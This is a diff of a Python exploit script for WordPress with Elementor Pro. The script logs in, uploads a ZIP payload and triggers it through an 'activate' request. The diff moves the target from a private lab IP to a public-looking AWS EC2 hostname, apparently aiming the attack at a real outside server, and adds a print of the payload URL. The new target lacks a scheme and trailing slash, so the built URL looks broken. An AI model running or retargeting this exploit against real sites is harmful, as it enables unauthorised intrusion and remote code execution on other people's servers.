@@ -59,7 +59,7 @@ import re
 
 # Change the following 4 variables:
 payloadFileName = 'elementor-pro.zip' # Change this with the path of the ZIP archive that contains your payload
-baseUrl = 'http://192.168.56.103/wordpress/' # Change this with the base url of the target
+baseUrl = 'ec2-175-41-162-1.ap-southeast-1.compute.amazonaws.com' # Change this with the base url of the target
 username = 'guest' # Change this with the username you want to use to log in
 password = 'test' # Change this with the password you want to use to log in
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
@@ -111,7 +111,7 @@ def UploadFile(fileName, nonce):
 def ActivatePayload():
 	payloadUrl = baseUrl + 'index.php?activate=1'
 	session.get(payloadUrl)
-
+	print(payloadUrl)
 	
 print('Trying to login...')
 nonce = DoLogin(username, password)
